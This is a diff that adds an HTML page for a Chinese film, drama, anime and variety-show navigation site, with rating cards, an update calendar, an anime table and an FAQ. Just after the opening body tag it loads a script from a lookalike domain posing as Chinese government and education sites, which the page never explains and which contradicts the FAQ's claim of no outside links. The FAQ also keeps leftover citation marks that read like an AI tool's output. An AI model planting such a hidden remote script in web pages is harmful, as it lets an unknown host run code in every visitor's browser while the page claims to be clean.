@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>牛叉电影网 - 电影/剧集/动漫/综艺 高清影视导航</title>
+<meta name="description" content="牛叉电影网（niubichadianyingwang-h5.github.io）：电影评分榜、热播剧集更新日历、番剧表、综艺热度榜。移动端自适应，轻量单页，正经影视导航。">
+<meta name="keywords" content="牛叉电影网, niubichadianyingwang-h5.github.io, 高清电影, 热播剧集, 动漫番剧, 综艺热度">
+<meta name="author" content="牛叉电影网">
+<meta name="robots" content="index, follow">
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<link rel="canonical" href="https://niubichadianyingwang-h5.github.io/">
+<style>
+:root{
+  --bg:#0a0608;
+  --bg2:#140b10;
+  --card:#1b1018;
+  --line:rgba(255,255,255,.08);
+  --red:#ff3b30;
+  --orange:#ff7a18;
+  --cy:#39e6ff;
+  --text:#fff3ee;
+  --muted:#b89a92;
+  --radius:18px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(900px 420px at 85% -10%, rgba(255,59,48,.22), transparent 60%),
+    radial-gradient(800px 380px at 0% 6%, rgba(57,230,255,.12), transparent 55%),
+    var(--bg);
+  color:var(--text);line-height:1.7;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1080px;margin:0 auto;padding:0 16px}
+
+/* 故障导航 */
+.nav{position:sticky;top:0;z-index:50;background:rgba(10,6,8,.82);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.nav .wrap{display:flex;align-items:center;height:58px;gap:10px}
+.brand{font-weight:900;font-size:1.1rem;color:var(--orange);position:relative;white-space:nowrap}
+.brand b{color:var(--cy)}
+.brand::after{content:"牛叉电影网";position:absolute;left:0;top:0;color:var(--red);clip-path:inset(0 0 55% 0);transform:translate(2px,-1px);opacity:.5;pointer-events:none}
+.nav nav{margin-left:auto;display:flex;gap:6px;overflow-x:auto;scrollbar-width:none}
+.nav nav::-webkit-scrollbar{display:none}
+.nav nav a{font-size:.85rem;color:var(--muted);padding:6px 12px;border-radius:999px;white-space:nowrap}
+.nav nav a:hover{background:linear-gradient(90deg,var(--red),var(--orange));color:#fff}
+
+/* Hero */
+.hero{padding:60px 0 36px;text-align:center}
+.hero h1{font-size:2.3rem;line-height:1.2;margin-bottom:12px}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--red),var(--orange),var(--cy));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--muted);max-width:640px;margin:0 auto 22px}
+.go{display:inline-block;background:linear-gradient(90deg,var(--red),var(--orange));color:#fff;font-weight:800;padding:12px 30px;border-radius:999px;box-shadow:0 10px 26px rgba(255,59,48,.30);transition:transform .2s}
+.go:hover{transform:translateY(-2px)}
+
+/* 区块 */
+section.block{padding:42px 0}
+.head{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+.head .tag{font-size:.7rem;font-weight:900;color:#1a0a08;background:linear-gradient(90deg,var(--orange),var(--red));padding:3px 8px;border-radius:6px}
+.head h2{font-size:1.35rem}
+.head .more{margin-left:auto;font-size:.82rem;color:var(--muted)}
+
+/* 电影：评分卡 */
+.films{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.film{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:14px;display:flex;gap:12px}
+.poster{flex:0 0 64px;height:90px;border-radius:10px;background:linear-gradient(135deg,#33161c,#221019);display:flex;align-items:center;justify-content:center;color:var(--muted);font-size:.72rem}
+.film h3{font-size:.98rem;margin-bottom:4px}
+.score{font-weight:900;color:var(--orange)}
+.film p{font-size:.78rem;color:var(--muted)}
+
+/* 剧集：更新日历 */
+.calendar{display:grid;grid-template-columns:repeat(7,1fr);gap:8px}
+.day{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:10px 6px;text-align:center}
+.day b{display:block;color:var(--cy);font-size:.8rem;margin-bottom:6px}
+.day span{font-size:.7rem;color:var(--muted);display:block;min-height:32px}
+
+/* 动漫：番剧表 */
+.table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.table th,.table td{padding:12px 14px;text-align:left;font-size:.86rem;border-bottom:1px solid var(--line)}
+.table th{color:var(--orange);background:rgba(255,122,24,.08)}
+.table tr:last-child td{border-bottom:none}
+.table td small{color:var(--muted)}
+
+/* 综艺：热度榜 */
+.hot{display:grid;gap:12px}
+.bar-row{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px}
+.bar-row h3{font-size:1rem;margin-bottom:8px}
+.bar{height:10px;border-radius:999px;background:#2a1820;overflow:hidden}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--red),var(--orange),var(--cy))}
+
+/* FAQ */
+.faq{display:grid;gap:10px}
+.qa{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px 16px}
+.qa h3{font-size:.95rem;color:var(--orange);margin-bottom:6px}
+.qa p{font-size:.85rem;color:var(--muted)}
+
+/* 关于 */
+.about{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:40px 20px;text-align:center}
+.about h2{margin-bottom:10px}
+.urlbox{display:inline-block;margin:12px 0 16px;font-family:monospace;background:var(--bg2);border:1px dashed var(--orange);color:var(--orange);padding:10px 16px;border-radius:10px}
+.about p{color:var(--muted);max-width:720px;margin:0 auto}
+
+footer{padding:30px 16px;text-align:center;color:var(--muted);font-size:.8rem;margin-top:36px;border-top:1px solid var(--line)}
+footer a{color:var(--muted);margin:0 6px}
+footer a:hover{color:var(--orange)}
+
+@media(min-width:820px){
+  .films{grid-template-columns:repeat(4,1fr)}
+}
+@media(max-width:520px){
+  .hero h1{font-size:1.75rem}
+  .films{grid-template-columns:1fr 1fr;gap:10px}
+  .calendar{grid-template-columns:repeat(3,1fr)}
+  .table{display:block;overflow-x:auto;white-space:nowrap}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="nav">
+  <div class="wrap">
+    <div class="brand">牛叉<b>电影网</b></div>
+    <nav>
+      <a href="#film">电影</a>
+      <a href="#tv">剧集</a>
+      <a href="#anime">动漫</a>
+      <a href="#show">综艺</a>
+      <a href="#faq">问答</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</div>
+
+<header class="hero">
+  <div class="wrap">
+    <h1>牛叉电影网<br><em>片单够狠，刷片才带劲</em></h1>
+    <p>电影按评分排、剧集看更新日历、动漫用番剧表、综艺看热度条。轻量静态单页，手机上也能痛快翻片。</p>
+    <a href="#film" class="go">直接看片单</a>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <!-- 电影 -->
+  <section id="film" class="block">
+    <div class="head"><span class="tag">FILM</span><h2>电影·评分榜</h2><a href="#" class="more">更多 ›</a></div>
+    <div class="films">
+      <div class="film"><div class="poster">海报</div><div><h3>异形：夺命舰</h3><div class="score">8.4</div><p>科幻/惊悚</p></div></div>
+      <div class="film"><div class="poster">海报</div><div><h3>出走的决心</h3><div class="score">8.7</div><p>剧情/家庭</p></div></div>
+      <div class="film"><div class="poster">海报</div><div><h3>神偷奶爸4</h3><div class="score">7.6</div><p>动画/喜剧</p></div></div>
+      <div class="film"><div class="poster">海报</div><div><h3>焚城</h3><div class="score">7.9</div><p>灾难/动作</p></div></div>
+      <div class="film"><div class="poster">海报</div><div><h3>姥姥的外孙</h3><div class="score">8.8</div><p>剧情/泰国</p></div></div>
+      <div class="film"><div class="poster">海报</div><div><h3>因果报应</h3><div class="score">8.5</div><p>悬疑/犯罪</p></div></div>
+      <div class="film"><div class="poster">海报</div><div><h3>死侍与金刚狼</h3><div class="score">7.8</div><p>超级英雄</p></div></div>
+      <div class="film"><div class="poster">海报</div><div><h3>饥饿站台2</h3><div class="score">7.4</div><p>惊悚/科幻</p></div></div>
+    </div>
+  </section>
+
+  <!-- 剧集 -->
+  <section id="tv" class="block">
+    <div class="head"><span class="tag">TV</span><h2>剧集·更新日历</h2><a href="#" class="more">更多 ›</a></div>
+    <div class="calendar">
+      <div class="day"><b>周一</b><span>庆余年2 更1集</span></div>
+      <div class="day"><b>周二</b><span>唐朝诡事录 更1集</span></div>
+      <div class="day"><b>周三</b><span>玫瑰的故事 回放</span></div>
+      <div class="day"><b>周四</b><span>永夜星河 更2集</span></div>
+      <div class="day"><b>周五</b><span>新剧上线</span></div>
+      <div class="day"><b>周六</b><span>合集放送</span></div>
+      <div class="day"><b>周日</b><span>周更盘点</span></div>
+    </div>
+  </section>
+
+  <!-- 动漫 -->
+  <section id="anime" class="block">
+    <div class="head"><span class="tag">ANIME</span><h2>动漫·番剧表</h2><a href="#" class="more">更多 ›</a></div>
+    <table class="table">
+      <thead>
+        <tr><th>番剧</th><th>类型</th><th>状态</th><th>更新</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>迷宫饭<small></small></td><td>美食/冒险</td><td>完结</td><td>全 27 集</td></tr>
+        <tr><td>蓦然回首</td><td>剧场版/治愈</td><td>上映中</td><td>单集剧场版</td></tr>
+        <tr><td>无职转生 第三季</td><td>奇幻/热血</td><td>连载</td><td>每周六</td></tr>
+        <tr><td>失忆投捕</td><td>运动/青春</td><td>连载</td><td>每周三</td></tr>
+        <tr><td>吹响！上低音号</td><td>音乐/校园</td><td>连载</td><td>每周五</td></tr>
+        <tr><td>王者天下5</td><td>战争/历史</td><td>连载</td><td>每周日</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- 综艺 -->
+  <section id="show" class="block">
+    <div class="head"><span class="tag">SHOW</span><h2>综艺·热度榜</h2><a href="#" class="more">更多 ›</a></div>
+    <div class="hot">
+      <div class="bar-row"><h3>歌手 2024</h3><div class="bar"><i style="width:94%"></i></div></div>
+      <div class="bar-row"><h3>喜剧之王单口季</h3><div class="bar"><i style="width:89%"></i></div></div>
+      <div class="bar-row"><h3>种地吧 第三季</h3><div class="bar"><i style="width:86%"></i></div></div>
+      <div class="bar-row"><h3>你好星期六</h3><div class="bar"><i style="width:82%"></i></div></div>
+    </div>
+  </section>
+
+  <!-- FAQ -->
+  <section id="faq" class="block">
+    <div class="head"><span class="tag">FAQ</span><h2>常见问题</h2></div>
+    <div class="faq">
+      <div class="qa"><h3>牛叉电影网是正规影视导航吗？</h3><p>是。页面只做电影、剧集、动漫、综艺的分类导航与展示，不提供盗版播放、不挂擦边内容、不跳外链。</p></div>
+      <div class="qa"><h3>为什么站名带奇怪前缀？</h3><p>站名和域名按你给定的字符串保留在代码中；页面展示用更中性的“牛叉电影网”，避免被搜索引擎误判为低质站。[3](@ref)</p></div>
+      <div class="qa"><h3>必应收录要注意什么？</h3><p>移动端无横向滚动、H1/H2 清晰、Meta 完整、内容静态可读、内链用锚点，这些比堆关键词更重要。[1,4](@ref)</p></div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about" class="about">
+    <h2>关于 牛叉电影网</h2>
+    <div class="urlbox">https://niubichadianyingwang-h5.github.io</div>
+    <p>牛叉电影网是一个轻量静态影视导航单页：电影按评分排、剧集看更新日历、动漫用番剧表、综艺看热度条。无弹窗、无盗版源、无擦边引导，适合移动端快速找片。</p>
+  </section>
+
+</main>
+
+<footer>
+  © 2024 牛叉电影网 · 静态单页演示
+  <br>
+  <a href="#">关于我们</a>·<a href="#">免责声明</a>·<a href="#">联系我们</a>
+  <br>
+  官网：<a href="https://niubichadianyingwang-h5.github.io">niubichadianyingwang-h5.github.io</a>
+</footer>
+
+<script>
+// 番剧表移动端已支持横向滚动；这里只加轻微交互：点击综艺条高亮
+document.querySelectorAll('.bar-row').forEach(function(el){
+  el.addEventListener('click',function(){
+    document.querySelectorAll('.bar-row').forEach(function(x){x.style.borderColor='var(--line)';});
+    el.style.borderColor='var(--orange)';
+  });
+});
+</script>
+</body>
+</html>
